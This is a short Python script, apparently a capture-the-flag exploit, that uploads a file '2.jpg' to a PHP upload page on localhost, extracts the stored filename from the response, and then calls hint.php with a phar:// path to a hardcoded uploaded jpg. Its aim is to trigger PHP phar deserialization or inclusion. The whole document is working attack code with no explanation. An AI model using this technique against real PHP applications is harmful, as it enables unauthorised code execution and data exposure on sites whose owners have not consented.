import requests
import re
url = "http://localhost:7000/uploadupload.php"

while True:
	r = requests.post(url,files = {'file':open('2.jpg','rb')})
	filename = re.search('<div id="msg">.*?(.*?)</div>',r.text).group(1)
	print(filename)
	r = requests.get("http://localhost:7000/file/"+filename)
	if r.status_code == 200:
		r = requests.get("http://localhost:7000/hint.php?name=phar://./file/e94550c93cd70fe748e6982b3439ad3b.jpg/2")
		print(r.text)
	exit()